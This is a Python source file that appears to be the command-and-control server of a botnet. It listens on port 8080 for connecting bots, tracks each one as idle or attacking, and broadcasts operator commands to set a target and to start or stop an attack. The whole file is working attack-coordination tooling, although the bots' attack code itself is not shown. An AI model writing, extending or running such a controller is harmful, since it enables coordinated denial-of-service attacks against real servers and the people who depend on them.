import socket
import threading
from threading import Event
from time import sleep

active_connections_lock = threading.Lock()
active_connections = 0
conn_dict_lock = threading.Lock()
conn_dict = {}  # key is the connection address, value is either "Idle" or "Attacking"
target = ""

# event that can be used to tell all threads to stop running or attacking
stop_event = threading.Event() 
command = ""


def acceptor(s: socket.socket):
    global active_connections
    global conn_dict
    while not stop_event.is_set():
        try:
            connection, address = s.accept()
            ip, port = address
            conn_name = ip +":"+ str(port)
            print("Got connection from ", address)
            with active_connections_lock:
                active_connections += 1
            print("currently handling", active_connections, "connections")
            client_thread = threading.Thread(target=handle_client, args=(connection, address))
            client_thread.start()
            print(conn_dict)
        except socket.timeout:  
            # use periodic time outs to check if the user has pressed ctrl+c, 
            # because accept() is a blocking call and it keeps ctrl+c in the queue until it a connection finally comes in
            continue


# function to handle a client connection if any
def handle_client(conn: socket.socket, addr):
    global active_connections
    global command
    global conn_dict
    conn.settimeout(1)
    state = "stopped"
    ip, port = addr
    conn_name = ip +":"+ str(port)
    prev_command = ""
    
    while not stop_event.is_set():
        try:
            conn.recv(1024)
        except socket.timeout:
            pass
        except :
            print("")
            print("Client must have disconnected:", addr)
            break
        if command != prev_command:
            if command.split(' ')[0] == "target":
                if state == "attacking":
                    print("Attack is still going on. Please stop the attack before changing the target.")
                elif state != "attacking":
                    print("Changing target...")
                    conn.send(command.encode())
            else: # this block only executes if the command changes the attack state
                if command == "start" and state != "attacking":
                    state = "attacking"
                    print("command is ", command.encode())
                    conn.send(command.encode())
                elif command == "stop" and state == "attacking":
                    state = "stopped"
                    print("command is ", command.encode())
                    conn.send(command.encode())
                with conn_dict_lock:
                    conn_dict[conn_name] = state
        prev_command = command

    conn.close()
    # Decrement the active connection count and remove the connection from the dict
    with active_connections_lock:
        active_connections -= 1
        print(active_connections, "connections left")
    with conn_dict_lock:
        del conn_dict[conn_name]


def getAttackDetails():
    conn_list = []
    is_attacking = False
    state = "Idle"
    print(conn_dict)
    for key, val in conn_dict.items():
        print("wtf?", key, val)
        conn_list.append({"connection":key, "state":val})
    for key, val in conn_dict.items():
        if val == "attacking":
            is_attacking = True
            break
    if is_attacking:
        state = "Attacking"
    return {"target": target, "num_conns": active_connections, "conns": conn_list, "state": state}


def main():
    global target
    global command

    # socket creation and initialization
    s = socket.socket()
    print("")
    print("Socket created.")
    s.settimeout(1)
    s.bind(('0.0.0.0', 8080))
    print("Socket binded to 8080")
    print("")

    # listen for any incoming connections from clients
    s.listen(5)
    # start a thread that accepts incoming connections from botnets
    acceptor_thread = threading.Thread(target=acceptor, args=(s,))
    acceptor_thread.start()

    try:
        while s and not stop_event.is_set():
            if active_connections > 0:
                sleep(1)
                command = input("> ")
                if command.split(' ')[0] == "target":
                    target = command.split(' ')[1]
                    print(command.split(' ')[0])
            else:
                print("Waiting for connection...", end='\r', flush=True)
                        
    except KeyboardInterrupt:
        # clean everything up once the user presses ctrl+c
        stop_event.set()
        acceptor_thread.join()
        # flask_thread.join()
        print("")
        print("Closing socket...")
        s.close()
        print("Closing server...")
        print("")
        exit()       

if __name__ == "__main__":
    main()
